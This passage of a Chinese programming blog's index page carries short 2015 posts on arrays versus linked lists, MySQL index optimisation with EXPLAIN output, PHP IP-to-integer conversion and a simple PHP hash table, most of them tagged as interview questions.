      <a data-url="http://3wbuild.com/a/ubutu__lmp_php5.3_安装_Zed_Debugger/" data-id="cipqlt2d8003rhypdfmfl4nts" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-数组与链表的区别" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/数组与链表的区别/" class="article-date">
  <time datetime="2015-03-14T00:13:56.000Z" itemprop="datePublished">2015-03-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/数据结构与算法/">数据结构与算法</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/数组与链表的区别/">数组与链表的区别</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<pre id="best-content-479502239">二者都属于一种数据结构
从逻辑结构来看
1\. 数组必须事先定义固定的长度（元素个数），不能适应数据动态地增减的情况。当数据增加时，可能超出原先定义的元素个数；当数据减少时，造成内存浪费；数组可以根据下标直接存取。
2\. 链表动态地进行存储分配，可以适应数据动态地增减的情况，且可以方便地插入、删除数据项。（数组中插入、删除数据项时，需要移动其它数据项，非常繁琐）链表必须根据next指针找到下一个元素
从内存存储来看
1\. (静态)数组从栈中分配空间, 对于程序员方便快速,但是自由度小
2\. 链表从堆中分配空间, 自由度大但是申请管理比较麻烦 

从上面的比较可以看出，如果需要快速访问数据，很少或不插入和删除元素，就应该用数组；相反， 如果需要经常插入和删除元素就需要用链表数据结构了。</pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/数组与链表的区别/" data-id="cipqlt2cb001jhypdxo9a5nja" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/百度面试题/">百度面试题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-小说系统索引优化案例" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/小说系统索引优化案例/" class="article-date">
  <time datetime="2015-03-12T00:55:03.000Z" itemprop="datePublished">2015-03-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/mysql/">mysql</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/小说系统索引优化案例/">小说系统索引优化案例</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>小说系统索引优化案例</p>
<p>&nbsp;</p>
<p>表以及索引结构如下：</p>
<p>b_book_info | CREATE TABLE <code>b_book_info</code> (<br><code>id</code> int(11) NOT NULL AUTO_INCREMENT COMMENT ‘主键’,<br><code>name</code> varchar(64) NOT NULL COMMENT ‘小说名称’,<br><code>provider_id</code> int(11) NOT NULL COMMENT ‘内容提供商id，对应 b_book_provider 的 id’,<br><code>big_image</code> char(32) NOT NULL DEFAULT ‘’,<br><code>big_image_url</code> varchar(256) NOT NULL COMMENT ‘小说的大图，尺寸200×250，以http开头’,<br><code>small_image</code> char(32) NOT NULL DEFAULT ‘’,<br><code>small_image_url</code> varchar(256) NOT NULL COMMENT ‘小说的小图，尺寸112×155，以http开头’,<br><code>list_url</code> varchar(256) NOT NULL COMMENT ‘小说全部目录链接，以http开头’,<br><code>read_url</code> varchar(256) NOT NULL COMMENT ‘小说阅读链接地址’,<br><code>category</code> varchar(64) NOT NULL COMMENT ‘小说分类，要求必须在以下分类中选择，如果不在将不会被收录。玄幻奇幻/武侠仙侠/都市言情/历史军事/游戏竞技/穿越时空/古代言情/总裁豪门/青春校园/耽美同人’,<br><code>category_url</code> varchar(256) NOT NULL COMMENT ‘小说分类链接，匹配站点对应分类，例如小说属于玄幻，匹配金山的分类为玄幻奇幻，对应的分类链接依然为站点玄幻分类链接。’,<br><code>num_of_words</code> int(8) NOT NULL COMMENT ‘小说字数’,<br><code>is_finished</code> tinyint(1) NOT NULL COMMENT ‘小说状态，请给定数字表示，1：连载中，2：已完结’,<br><code>summary</code> varchar(1024) NOT NULL COMMENT ‘小说简介 最多1024中英文字符’,<br><code>author</code> varchar(64) NOT NULL COMMENT ‘小说作者’,<br><code>author_url</code> varchar(256) NOT NULL COMMENT ‘小说作者列表页’,<br><code>last_update_time</code> varchar(32) NOT NULL COMMENT ‘小说最近更新时间，格式为YYYY-MM-DD hh:mm’,<br><code>view</code> int(11) NOT NULL COMMENT ‘小说阅读次数’,<br><code>is_free</code> tinyint(1) NOT NULL COMMENT ‘小说免费与否，请用数字表示，0：不免费，1：免费，2：部分章节免费；此处“免费”定义表示该小说无收费章节。’,<br><code>is_show</code> tinyint(1) DEFAULT ‘1’ COMMENT ‘是否显示’,<br><code>order_id</code> int(8) DEFAULT ‘1000’,<br><code>last_modify_time</code> int(11) DEFAULT NULL,<br><code>hot</code> int(11) DEFAULT ‘0’ COMMENT ‘本站统计的点击量，非供应商提供’,<br><code>node_id</code> int(11) NOT NULL DEFAULT ‘0’,<br><code>d_type</code> tinyint(4) DEFAULT ‘0’,<br><code>has_d</code> tinyint(4) DEFAULT ‘0’,<br><code>d_id</code> int(11) DEFAULT ‘0’,<br><code>d_src</code> char(4) DEFAULT ‘’,<br><code>d_node_id</code> int(11) NOT NULL DEFAULT ‘0’,<br><code>d_update_time</code> int(11) DEFAULT ‘0’,<br><code>d_modify_time</code> int(11) NOT NULL DEFAULT ‘0’,<br>PRIMARY KEY (<code>id</code>),<br>UNIQUE KEY <code>unique_name_author</code> (<code>name</code>,<code>author</code>),<br>KEY <code>index_view</code> (<code>view</code>),<br>KEY <code>index_words</code> (<code>num_of_words</code>),<br>KEY <code>index_auth</code> (<code>author</code>),<br>KEY <code>index_for_cate</code> (<code>category</code>,<code>is_finished</code>,<code>is_free</code>,<code>is_show</code>,<code>order_id</code>,<code>last_modify_time</code>),<br>KEY <code>ik_b_book_info_1</code> (<code>d_id</code>),<br>KEY <code>ik_b_book_info_0</code> (<code>has_d</code>,<code>d_update_time</code>),<br>KEY <code>index_category_is_show</code> (<code>category</code>,<code>is_show</code>,<code>order_id</code>,<code>last_modify_time</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=1003325 DEFAULT CHARSET=utf8 |</p>
<p>&nbsp;</p>
<p>案例一： 在复合索引中，查询条件对第一列没有要求，可以用in代替用来用到索引：</p>
<p>mysql&gt; explain select name,author from b_book_info where has_d in(0,1) and d_update_time&gt;0 limit 1;<br>+—-+————-+————-+——-+——————+——————+———+——+——–+————-+<br>| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |<br>+—-+————-+————-+——-+——————+——————+———+——+——–+————-+<br>| 1 | SIMPLE | b_book_info | range | ik_b_book_info_0 | ik_b_book_info_0 | 7 | NULL | 467536 | Using where |<br>+—-+————-+————-+——-+——————+——————+———+——+——–+————-+<br>1 row in set</p>
<p>mysql&gt; explain select name,author from b_book_info where d_update_time&gt;0 limit 1;<br>+—-+————-+————-+——+—————+——+———+——+——–+————-+<br>| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |<br>+—-+————-+————-+——+—————+——+———+——+——–+————-+<br>| 1 | SIMPLE | b_book_info | ALL | NULL | NULL | NULL | NULL | 935071 | Using where |<br>+—-+————-+————-+——+—————+——+———+——+——–+————-+<br>1 row in set</p>
<p>再次通过profile来验证，他们两个执行时间并无多大差别。我想可能是因为has_d的选择性太低，索引扫描会影响磁盘顺序扫描。</p>
<p>而且他们的执行结果也有差别，这个的原因可能是索引的排列顺序和物理列的排列顺序不同所导致的吧。</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/小说系统索引优化案例/" data-id="cipqlt2ch0022hypd5j3uhurw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-mysql创建高性能的索引" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/mysql创建高性能的索引/" class="article-date">
  <time datetime="2015-03-11T11:32:49.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/mysql/">mysql</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/mysql创建高性能的索引/">mysql创建高性能的索引</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>mysql创建高性能的索引，一些注意事项：</p>
<p>多列索引，要将离散度高的列放在前面；</p>
<p>多个单列索引，where条件是and，or，或者他们的组合，mysql优化器会自动采用 索引合并策略 index_merge</p>
<p>如果某个列，集中在某个值上的数据太多，即基数太大，则会对索引的优化产生误判，会产生慢查询，对此类要修改应用程序。</p>
<p>前缀索引字节数： select count(distinct left(author,7))/count(<em>) , count(distinct left(author,6))/count(</em>) , count(distinct left(author,5))/count(*)  from b_book_info where 1 limit 1;</p>
<p>前缀索引不能用于orderby groupby 和索引覆盖查询。</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/mysql创建高性能的索引/" data-id="cipqlt2dc0044hypdediw814g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-php实现IP地址转换为整型" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/php实现IP地址转换为整型/" class="article-date">
  <time datetime="2015-03-11T02:38:37.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP笔试题/">PHP笔试题</a>►<a class="article-category-link" href="/categories/PHP笔试题/数据结构与算法/">数据结构与算法</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/php实现IP地址转换为整型/">php实现IP地址转换为整型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="php实现IP地址转换为整型数字实例"><a href="#php实现IP地址转换为整型数字实例" class="headerlink" title="php实现IP地址转换为整型数字实例"></a>php实现IP地址转换为整型数字实例</h1><p>&nbsp;</p>
<p>【转换原理】：假设IP为：w.x.y.z，则IP地址转为整型数字的计算公式为：intIP = 256<em>256</em>256<em>w + 256</em>256<em>x + 256</em>y + z</p>
<p>【PHP的互转】：PHP的转换方式比较简单，它内置了两个函数</p>
<p><strong>int ip2long</strong> ( string $ip_address ) //ip转换成整型数值<br><strong>string long2ip</strong> ( string $proper_address ) // 整型数值转换成ip【MySQL的互转】：相对于MsSQL来说MySQL的转换方式比较简单，它和PHP一样也内置了两个函数</p>
<p>IP 转为整型:</p>
<p><a href="http://www.111cn.net/tags.php/select/" target="_blank" rel="external">select</a> INET_ATON (IP地址)整型数值转换成IP</p>
<p>select INET_NTOA ( IP的整型数值 )<br>一个实例</p>
<p>1.手工自己的实现方法</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>function ip2number($ip)<br>{</p>
<p>$t = <a href="http://www.111cn.net/tags.php/explode/" target="_blank" rel="external">explode</a>(‘.’, $ip);<br>$x = 0;<br>for ($i = 0; $i &lt; 4; $i++)</p>
<p>{<br>$x = $x * 256 + $t[$i];</p>
<p>}<br>return $x;</p>
<p>}</p>
<p>function number2ip($num)</p>
<p>{<br>$t = $num;<br>$a = array();</p>
<p>for ($i = 0; $i &lt; 4; $i++)<br>{<br>$x = $t % 256;<br>if($x &lt; 0) $x += 256;<br>array_unshift($a, $x);<br>$t = intval($t / 256);<br>}<br>return implode(‘.’, $a);<br>}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/php实现IP地址转换为整型/" data-id="cipqlt2da0040hypdbk5qrxmw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/小米面试题/">小米面试题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-用PHP实现LRU算法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/用PHP实现LRU算法/" class="article-date">
  <time datetime="2015-03-10T03:17:38.000Z" itemprop="datePublished">2015-03-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP/">PHP</a>►<a class="article-category-link" href="/categories/PHP/PHP笔试题/">PHP笔试题</a>►<a class="article-category-link" href="/categories/PHP/PHP笔试题/数据结构与算法/">数据结构与算法</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/用PHP实现LRU算法/">用PHP实现LRU算法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>用PHP实现LRU算法</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/用PHP实现LRU算法/" data-id="cipqlt2c30011hypdcn8tn49t" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/百度面试题/">百度面试题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-用PHP来实现hash算法与一致性hash算法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/用PHP来实现hash算法与一致性hash算法/" class="article-date">
  <time datetime="2015-03-07T01:23:47.000Z" itemprop="datePublished">2015-03-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP笔试题/">PHP笔试题</a>►<a class="article-category-link" href="/categories/PHP笔试题/数据结构与算法/">数据结构与算法</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/用PHP来实现hash算法与一致性hash算法/">用PHP来实现hash算法与一致性hash算法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<p>hash算法与一致性hash算法的区别，以及用用PHP来实现hash算法与一致性hash算法</p>
<p>&nbsp;</p>
<p>hash算法：<br>Class ClassA{<br>private $buckets;<br>private $size=10;<br>public function __construct(){<br>$this-&gt;buckets = new SplFixedArray($this-&gt;size);<br>}<br>public static function instance(){<br>return new ClassA();<br>}<br>private function funcHash($key){<br>$str_len = strlen($key);<br>for($i=0;$i&lt;$str_len;$i++){<br>$hashval += ord($key{$i});<br>}<br>return $hashval % $this-&gt;size;<br>}<br>public function insert($key,$val){<br>$index = $this-&gt;funcHash($key);<br>$this-&gt;buckets[$index] = $val;<br>}<br>public function find($key){<br>$index = $this-&gt;funcHash($key);<br>return $this-&gt;buckets[$index];<br>}</p>
<p>}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/用PHP来实现hash算法与一致性hash算法/" data-id="cipqlt2c1000shypdp84cqxvy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/滴滴打车面试题/">滴滴打车面试题</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/百度面试题/">百度面试题</a></li></ul>

    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP/">HTTP</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP/PHP/">PHP</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP/">PHP</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP/调试/">调试</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP笔试题/">PHP笔试题</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/mysql/">mysql</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/nginx/">nginx</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/nginx/PHP/">PHP</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/工具/">工具</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/PHP笔试题/">PHP笔试题</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/PHP笔试题/数据结构与算法/">数据结构与算法</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/redis/">redis</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/调试/">调试</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP笔试题/">PHP笔试题</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP笔试题/数据结构与算法/">数据结构与算法</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mi/">mi</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mi/PHP/">PHP</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP/">PHP</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP/PHP笔试题/">PHP笔试题</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP笔试题/">PHP笔试题</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP笔试题/redis/">redis</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/前端/移动/">移动</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/数据结构与算法/">数据结构与算法</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/脑洞/">脑洞</a><span class="category-list-count">2</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/凤凰网面试题/">凤凰网面试题</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小米面试题/">小米面试题</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/滴滴打车面试题/">滴滴打车面试题</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/猎豹移动面试题/">猎豹移动面试题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/百度面试题/">百度面试题</a><span class="tag-list-count">9</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/凤凰网面试题/" style="font-size: 17.5px;">凤凰网面试题</a> <a href="/tags/小米面试题/" style="font-size: 15px;">小米面试题</a> <a href="/tags/滴滴打车面试题/" style="font-size: 12.5px;">滴滴打车面试题</a> <a href="/tags/猎豹移动面试题/" style="font-size: 10px;">猎豹移动面试题</a> <a href="/tags/百度面试题/" style="font-size: 20px;">百度面试题</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">19</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/a/Hello_World/">Hello World</a>
          </li>
        
          <li>
            <a href="/a/读《Web前端黑客技术揭秘》思考/">读《Web前端黑客技术揭秘》思考</a>
          </li>
        
          <li>
            <a href="/a/听《Web安全分享》/">听《Web安全分享》</a>
          </li>
        
          <li>
            <a href="/a/读《图解HTTP》/">读《图解HTTP》</a>
          </li>
        
          <li>
            <a href="/a/golag_defer的使用/">golang defer的使用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 王桐<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>